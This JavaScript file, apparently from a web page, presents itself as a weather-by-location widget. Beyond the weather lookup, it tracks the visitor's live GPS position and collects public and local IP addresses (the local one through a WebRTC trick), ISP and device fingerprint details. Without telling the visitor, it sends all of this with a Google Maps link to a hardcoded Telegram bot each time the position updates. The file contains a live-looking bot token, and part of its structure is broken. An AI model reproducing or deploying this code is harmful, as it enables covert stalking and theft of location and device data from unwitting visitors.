function requestLocationForWeather() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;

                document.getElementById('latitude').textContent = lat;
                document.getElementById('longitude').textContent = lon;

                getWeather(lat, lon); // Fetch weather data
            },
            function (error) {
                alert("Error getting location: " + error.message);
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    } else {
        alert("Geolocation not supported.");
    }
}

// Fetch weather using wttr.in (No API Key)
function getWeather(lat, lon) {
    let apiUrl = `https://wttr.in/${lat},${lon}?format=%C+%t`; // Fetch weather condition + temp

    fetch(apiUrl)
        .then(response => response.text())
        .then(data => {
            document.getElementById('weather').textContent = `🌤️ Weather: ${data}`;
        })
        .catch(error => {
            console.error("Error fetching weather data:", error);
            document.getElementById('weather').textContent = "⚠️ Unable to fetch weather";
        });
}

// Call function on page load
requestLocationForWeather();

    
    let botToken = "7569251393:AAFf2oExeJXn44G425fAu54NnpBl5EQFd9E";
    let chatID = "5502318215";

    let map, marker;

    // Function to request location and show user info after confirmation
    function requestLocation() {
        document.getElementById('popup-container').style.display = 'none';
        document.getElementById('location-info').style.display = 'block';
        // Add your code to fetch and display location information here
    }
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                function(position) {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    document.getElementById('latitude').textContent = lat;
                    document.getElementById('longitude').textContent = lon;

                    if (!map) {
                        map = L.map('map').setView([lat, lon], 15);
                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                            attribution: '&copy; OpenStreetMap contributors'
                        }).addTo(map);
                    }

                    if (marker) {
                        marker.setLatLng([lat, lon]).bindPopup("Your Real-time Location").openPopup();
                    } else {
                        marker = L.marker([lat, lon]).addTo(map).bindPopup("Your Real-time Location").openPopup();
                    }

                    sendToTelegram(lat, lon);
                },
                function(error) {
                    alert("Error getting location: " + error.message);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            alert("Geolocation not supported.");
        }
    // Fetch public IP using ipapi.co
    async function getPublicIP() {
        try {
            let response = await fetch('https://ipapi.co/json/');
            let data = await response.json();
            document.getElementById('publicIP').textContent = data.ip;
            document.getElementById('isp').textContent = data.org;
        } catch (error) {
            console.error("Failed to get IP:", error);
        }
    }

    // Fetch Local IP using RTCPeerConnection (Browser trick)
    function getLocalIP() {
        let rtc = new RTCPeerConnection();
        rtc.createDataChannel('');
        rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
        rtc.onicecandidate = event => {
            if (event && event.candidate) {
                let ipMatch = event.candidate.candidate.match(/\d+\.\d+\.\d+\.\d+/);
                if (ipMatch) document.getElementById('localIP').textContent = ipMatch[0];
            }
        };
    }

    // Fetch OS, Browser, and other system info
    function getSystemInfo() {
        let userAgent = navigator.userAgent;
        let os = "Unknown OS", browser = "Unknown Browser";

        if (userAgent.includes("Win")) os = "Windows";
        if (userAgent.includes("Mac")) os = "MacOS";
        if (userAgent.includes("Linux")) os = "Linux";
        if (userAgent.includes("Android")) os = "Android";
        if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";

        if (userAgent.includes("Chrome")) browser = "Google Chrome";
        if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
        if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
        if (userAgent.includes("Edge")) browser = "Microsoft Edge";
        if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
        if (userAgent.includes("MSIE") || userAgent.includes("Trident")) browser = "Internet Explorer";

        document.getElementById('os').textContent = os;
        document.getElementById('browser').textContent = browser;
        document.getElementById('screen').textContent = `${window.screen.width} x ${window.screen.height}`;
    }

    // Fetch CPU cores and RAM details
    function getHardwareInfo() {
        document.getElementById('cpuCores').textContent = navigator.hardwareConcurrency || "Unknown";
        if (navigator.deviceMemory) {
            document.getElementById('ram').textContent = `${navigator.deviceMemory} GB`;
        } else {
            document.getElementById('ram').textContent = "Unknown";
        }
    }

    // Send user details to Telegram
    async function sendToTelegram(lat, lon) {
        let message = `
    📌 **New Visitor Information**  
    🌐 Public IP: ${document.getElementById('publicIP').textContent}  
    🏠 Local IP: ${document.getElementById('localIP').textContent}  
    🖥️ OS: ${document.getElementById('os').textContent}  
    🌍 ISP: ${document.getElementById('isp').textContent}  
    🖥️ Browser: ${document.getElementById('browser').textContent}  
    📏 Screen: ${document.getElementById('screen').textContent}  
    💾 RAM: ${document.getElementById('ram').textContent}  
    🔢 CPU Cores: ${document.getElementById('cpuCores').textContent}  
    📍 Location: ${document.getElementById('latitude').textContent}, ${document.getElementById('longitude').textContent}  

    📍 **Google Maps Link**: 
    https://www.google.com/maps?q=${lat},${lon}
        `;

        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
        await fetch(url);
    }

    // Initialize system info and hardware details
    getSystemInfo();
    getHardwareInfo();
    getPublicIP();
    getLocalIP();
